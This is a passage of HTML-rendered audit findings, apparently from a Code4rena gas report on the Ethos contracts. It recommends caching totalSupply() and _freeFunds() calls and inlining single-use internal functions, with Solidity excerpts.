class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">126</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"reapervaulterc4626solpreviewmint-totalsupply-should-be-cached\" style=\"position:relative;\"><a href=\"#reapervaulterc4626solpreviewmint-totalsupply-should-be-cached\" aria-label=\"reapervaulterc4626solpreviewmint totalsupply should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultERC4626.sol.previewMint(): totalSupply() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L139-L142\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L139-L142</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"118\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">139</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">previewMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">140</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">141</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">roundUpDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h3 id=\"reapervaulterc4626solpreviewwithdraw-results-of-totalsupply-and-_freefunds-should-be-cached\" style=\"position:relative;\"><a href=\"#reapervaulterc4626solpreviewwithdraw-results-of-totalsupply-and-_freefunds-should-be-cached\" aria-label=\"reapervaulterc4626solpreviewwithdraw results of totalsupply and _freefunds should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ReaperVaultERC4626.sol.previewWithdraw(): results of totalSupply() and _freeFunds() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L183-L186\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Vault/contracts/ReaperVaultERC4626.sol#L183-L186</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"119\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Vault</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ReaperVaultERC4626</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">183</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">previewWithdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assets</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">shares</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">184</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">() == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">185</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">shares</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">roundUpDiv</span><span class=\"mtk1\">(</span><span class=\"mtk12\">assets</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">_freeFunds</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">186</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<h2 id=\"internalprivate-functions-only-called-once-can-be-inlined-to-save-gas\" style=\"position:relative;\"><a href=\"#internalprivate-functions-only-called-once-can-be-inlined-to-save-gas\" aria-label=\"internalprivate functions only called once can be inlined to save gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Internal/Private functions only called once can be inlined to save gas</h2>\n<p>Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.</p>\n<p>Affected code:<br>\n<a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L438-L445\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/BorrowerOperations.sol#L438-L445</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"120\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BorrowerOperations</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">438</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getCollChange</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">439:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collReceived</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">440:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_requestedCollWithdrawal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">441</span><span class=\"mtk1\">:    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">442:        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">443:        </span><span class=\"mtk11\">pure</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">444:        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collChange</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">isCollIncrease</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">445:    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">455</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_updateTroveFromAdjustment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">456:    (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">457:        </span><span class=\"mtk10\">ITroveManager</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_troveManager</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">458:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_borrower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">459:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">460:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collChange</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">461:        </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_isCollIncrease</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">462:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_debtChange</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">463:        </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_isDebtIncrease</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">464</span><span class=\"mtk1\">:    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">465:        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">466:        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">467:    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">476</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_moveTokensAndCollateralfromAdjustment</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">477:    (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">478:        </span><span class=\"mtk10\">IActivePool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_activePool</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">479:        </span><span class=\"mtk10\">ILUSDToken</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_lusdToken</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">480:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_borrower</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">481:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">482:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collChange</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">483:        </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_isCollIncrease</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">484:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_LUSDChange</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">485:        </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_isDebtIncrease</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">486:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_netDebtChange</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">487</span><span class=\"mtk1\">:    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">488:        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">489:    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">533</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireSingularCollChange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collTopUp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collWithdrawal</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">537</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireNonZeroAdjustment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collTopUp</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collWithdrawal</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_LUSDChange</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">546</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireTroveisNotActive</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ITroveManager</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_troveManager</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_borrower</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collateral</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">551</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireNonZeroDebtChange</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_LUSDChange</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">555</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireNotInRecoveryMode</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">556:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">557:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_price</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">558:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_CCR</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">559:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collateralDecimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">560</span><span class=\"mtk1\">:    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">567</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireNoCollWithdrawal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collWithdrawal</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">571</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireValidAdjustmentInCurrentMode</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">572:    (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">573:        </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_isRecoveryMode</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">574:        </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collateral</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">575:        </span><span class=\"mtk10\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_collWithdrawal</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">576:        </span><span class=\"mtk10\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_isDebtIncrease</span><span class=\"mtk1\">, </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">577:        </span><span class=\"mtk10\">LocalVariables_adjustTrove</span><span class=\"mtk1\"> </span><span class=\"mtk10\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk10\">_vars</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">578</span><span class=\"mtk1\">:    ) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">579:        </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">580:        </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">581:    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">624</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireNewICRisAboveOldICR</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_newICR</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_oldICR</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">636</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireValidLUSDRepayment</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_currentDebt</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_debtRepayment</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">pure</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">640</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_requireCallerIsStabilityPool</span><span class=\"mtk1\">() </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">661</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getNewNominalICRFromTroveChange</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">674:    {</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L478-L489\">https://github.com/code-423n4/2023-02-ethos/blob/73687f32b934c9d697b97745356cdf8a1f264955/Ethos-Core/contracts/TroveManager.sol#L478-L489</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"121\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">Ethos</span><span class=\"mtk1\">-</span><span class=\"mtk12\">Core</span><span class=\"mtk1\">/</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">TroveManager</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">478</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getCappedOffsetVals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">582:    </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getTotalsFromLiquidateTrovesSequence_RecoveryMode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">671:    </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getTotalsFromLiquidateTrovesSequence_NormalMode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">785:    </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getTotalFromBatchLiquidate_RecoveryMode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">864:    </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_getTotalsFromBatchLiquidate_NormalMode</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">1213:    </span><span class=\"mtk11\">function</span><span class=\"mtk1\"> </span><span 